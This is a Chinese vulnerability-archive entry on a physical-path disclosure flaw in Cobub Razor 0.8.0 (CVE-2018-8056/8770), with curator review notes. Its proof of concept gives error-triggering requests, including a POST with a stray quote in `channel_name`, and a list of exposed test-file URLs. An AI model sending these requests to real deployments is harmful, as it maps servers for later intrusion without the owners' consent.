---
source: "白阁文库 BaizeSec/bylibrary"
title: "Cobub Razor 错误页物理路径泄露多入口"
product: "Cobub Razor"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-8056;CVE-2018-8770"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "0.8.0；错误显示/测试文件部署条件"
prerequisites: "依端点未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Cobub%20Razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
id: "vw-a81c37cef82a94222f964878"
entity_id: "ve-a81c37cef82a94222f964878"
schema_version: "1"
---

# Cobub Razor 错误页物理路径泄露多入口

## 条目说明

- 对象与具体问题：Cobub Razor；错误页物理路径泄露多入口
- 版本、配置及部署条件：0.8.0；错误显示/测试文件部署条件
- 认证与权限前提：依端点未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 方法一export/addchannel与方法二tests多端点应分组件；issue162与SQLi同需核关联
- 只有URL无错误响应；路径泄露不等于任意文件读，缺修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

#### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Cobub Razor 0.8.0存在物理路径泄露漏洞|2018-04-20|Kyhvedn（yinfengwuyueyi@163.com、kyhvedn@5ecurity.cn）|[http://www.cobub.com/](http://www.cobub.com/) | [https://github.com/cobub/razor/](https://github.com/cobub/razor/) | 0.8.0| [CVE-2018-8056](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8056)/[CVE-2018-8770](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8770)|  

##### 漏洞概述  

> Cobub Razor 0.8.0存在物理路径泄露漏洞，当访问特定url时，系统会显示物理路径信息。Cobub Razor是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/cobub/razor/issues/162)告知作者。   

#### POC实现代码如下：  

> 方法一：  

``` raw
URL: http://localhost/export.php
HTTP Method: GET
URL: http://localhost/index.php?/manage/channel/addchannel
HTTP Method: POST
Data: channel_name=test"&platform=1
```
> 方法二：  
> Cobub Razor 0.8.0存在物理路径泄露漏洞，当访问特定url时，系统会显示物理路径信息。Cobub Razor是一个在github上开源的系统。

``` raw
HTTP Method: GET
http://localhost/tests/generate.php
http://localhost/tests/controllers/getConfigTest.php
http://localhost/tests/controllers/getUpdateTest.php
http://localhost/tests/controllers/postclientdataTest.php
http://localhost/tests/controllers/posterrorTest.php
http://localhost/tests/controllers/posteventTest.php
http://localhost/tests/controllers/posttagTest.php
http://localhost/tests/controllers/postusinglogTest.php
http://localhost/tests/fixtures/Controller_fixt.php
http://localhost/tests/fixtures/Controller_fixt2.php
http://localhost/tests/fixtures/view_fixt2.php
http://localhost/tests/libs/ipTest.php
http://localhost/tests/models/commonDbfix.php
```


---

> 来源：白阁文库 BaizeSec/bylibrary
